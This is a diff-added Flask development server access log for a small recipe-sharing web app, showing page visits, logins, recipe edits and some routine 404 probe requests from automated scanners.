+172.236.1.60 - - [08/Oct/2024 20:29:21] "[33mGET /webfig/ HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:29:38] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:29:38] "[33mGET /admin/ HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:29:38] "[33mGET /static/historypage.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:29:52] "[33mGET /login.do HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:30:05] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:30:16] "[33mGET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:30:28] "[33mGET /aspera/faspex/ HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:30:28] "[33mGET /zabbix/favicon.ico HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:30:39] "[33mGET /sitecore/shell/sitecore.version.xml HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:30:52] "[33mGET /identity HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:31:03] "[33mGET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:31:03] "[33mGET /console HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:31:10] "[33mGET /ext-js/app/common/zld_product_spec.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:31:10] "[33mGET /showLogin.cc HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:31:19] "[33mGET /cgi-bin/main.pl HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:31:19] "[33mGET /index.jsp HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:31:25] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:31:25] "[33mGET /sugar_version.json HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:31:31] "[33mGET /OA_HTML/AppsLocalLogin.jsp HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:31:40] "[33mGET /owncloud/status.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:31:47] "[33mGET /status.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:31:59] "[33mGET /cgi-bin/authLogin.cgi HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:32:13] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:03:46] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:08:43] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:10:11] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 21:22:25] "[33mGET /index.asp HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 21:27:41] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:27:41] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:27:41] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:27:41] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:27:41] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:27:41] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:27:41] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:27:44] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:27:50] "GET /sign_in HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:27:51] "GET /sign_in HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:27:51] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:27:55] "GET /sign_in HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:27:55] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:27:56] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:27:56] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:27:56] "GET /sign_up HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:27:56] "GET /sign_up HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:27:56] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:17] "[32mPOST /register HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 21:29:17] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:17] "[36mGET /static/assets/recipes.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:17] "[36mGET /static/assets/profile.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:17] "[36mGET /static/assets/head_pic.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:17] "[36mGET /static/assets/chef.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:18] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:20] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:20] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:20] "[36mGET /static/assets/chef.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:20] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:21] "[36mGET /static/assets/head_pic.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:21] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:21] "[36mGET /static/assets/recipes.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:21] "[36mGET /static/assets/profile.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:29] "GET /my_profile HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:29] "GET /my_profile HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:29] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:33] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:33] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:34] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:37] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:37] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:37] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:37] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:37] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:38] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:38] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:44] "POST /all_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:45] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:50] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:50] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:29:55] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:56] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:29:56] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:30:01] "GET /new_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:30:01] "GET /new_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:30:01] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:30:05] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:30:36] "[32mPOST /adding_new_recipe HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 21:30:36] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:30:36] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+154.212.141.146 - - [08/Oct/2024 21:30:43] "GET / HTTP/1.1" 200 -
+103.149.26.234 - - [08/Oct/2024 21:30:44] "GET / HTTP/1.1" 200 -
+103.149.26.234 - - [08/Oct/2024 21:30:45] "GET /static/assets/cookbook.png HTTP/1.1" 200 -
+103.149.26.234 - - [08/Oct/2024 21:30:47] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:30:47] "POST /view_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:30:48] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+103.149.26.234 - - [08/Oct/2024 21:30:48] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:31:20] "GET /events HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:31:20] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:31:22] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:31:22] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:31:27] "GET /my_profile HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:31:27] "GET /my_profile HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:31:27] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:31:30] "GET /events HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:31:30] "GET /events HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:31:30] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:31:31] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:31:32] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:31:32] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:31:33] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:31:34] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:32:01] "GET /events HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:32:01] "GET /events HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:32:01] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:32:03] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:32:03] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:32:07] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:32:07] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:32:07] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:32:14] "POST /view_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:32:14] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:32:29] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:32:29] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:32:34] "GET /my_profile HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:32:34] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:32:36] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:32:36] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:32:36] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:32:43] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:32:43] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:32:47] "POST /edit_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:33:16] "POST /update_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:33:24] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:33:33] "[32mPOST /delete_recipe HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 21:33:33] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:37:22] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:37:22] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:37:22] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:37:22] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:37:22] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 21:37:22] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 21:37:22] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:18:51] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:18:51] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 22:18:51] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:18:51] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 22:18:51] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 22:18:51] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:18:51] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:21:25] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:21:25] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:21:26] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:21:26] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:21:26] "[36mGET /static/assets/profile.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 22:21:26] "[36mGET /static/assets/recipes.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 22:21:26] "[36mGET /static/assets/head_pic.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 22:21:26] "[36mGET /static/assets/chef.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 22:21:32] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:21:32] "[36mGET /static/assets/profile.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 22:21:32] "[36mGET /static/assets/head_pic.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 22:21:32] "[36mGET /static/assets/recipes.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 22:21:37] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:21:40] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:21:41] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:21:41] "[36mGET /static/assets/recipes.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 22:21:44] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:21:44] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:21:46] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:22:23] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:22:24] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:22:29] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:22:29] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:22:30] "GET /events HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:22:31] "GET /events HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:22:32] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:22:32] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:23:20] "GET / HTTP/1.1" 200 -
+198.235.24.121 - - [08/Oct/2024 22:29:54] "GET / HTTP/1.0" 200 -
+172.236.1.60 - - [08/Oct/2024 22:35:05] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:43:23] "POST /view_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:43:37] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:43:55] "POST /all_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:43:59] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:44:09] "[32mGET /logout HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 22:44:09] "[32mGET /logout HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 22:44:09] "GET /sign_in HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:44:13] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:44:13] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:44:15] "GET /about HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:44:15] "GET /about HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:44:16] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:44:17] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:44:21] "POST /all_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:44:25] "POST /view_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:49:22] "GET /sign_in HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:49:44] "[32mPOST /login HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 22:49:44] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:49:56] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:49:56] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:50:01] "GET /new_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:50:01] "GET /new_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:50:34] "[32mPOST /adding_new_recipe HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 22:50:34] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:50:47] "POST /view_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:50:53] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:50:58] "POST /view_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:51:02] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:51:06] "POST /view_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:51:11] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:51:20] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:51:21] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 22:52:44] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:03:12] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:08:23] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:15:54] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:15:54] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:15:54] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:15:54] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:15:54] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:15:54] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:15:54] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:15:54] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:15:54] "[33mGET /recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:16:33] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:16:33] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:16:33] "[36mGET /static/assets/head_pic.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:16:33] "[36mGET /static/assets/recipes.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:16:33] "[36mGET /static/assets/chef.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:16:33] "[36mGET /static/assets/profile.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:16:33] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:16:42] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:16:42] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:16:42] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:16:43] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:16:43] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:16:43] "[33mGET /recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:16:44] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:16:45] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:16:46] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:22:43] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:23:40] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:23:40] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:23:41] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:23:41] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:23:41] "[36mGET /static/assets/chef.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:23:41] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:23:41] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:23:41] "[36mGET /static/assets/profile.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:23:41] "[36mGET /static/assets/head_pic.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:23:41] "[36mGET /static/assets/recipes.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:23:41] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:23:42] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+ * Serving Flask app 'server'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://172.236.1.60:5000
+[33mPress CTRL+C to quit[0m
+172.236.1.60 - - [08/Oct/2024 23:24:37] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:24:37] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:24:39] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:24:39] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:24:39] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:24:57] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:24:57] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:24:57] "[36mGET /static/assets/chef.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:24:57] "[36mGET /static/assets/head_pic.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:24:57] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:24:57] "[36mGET /static/assets/recipes.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:24:57] "[36mGET /static/assets/profile.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:24:57] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:24:58] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:24:58] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 23:25:02] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:25:04] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 23:25:04] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 23:25:04] "[33mGET /home/ws HTTP/1.1[0m" 404 -
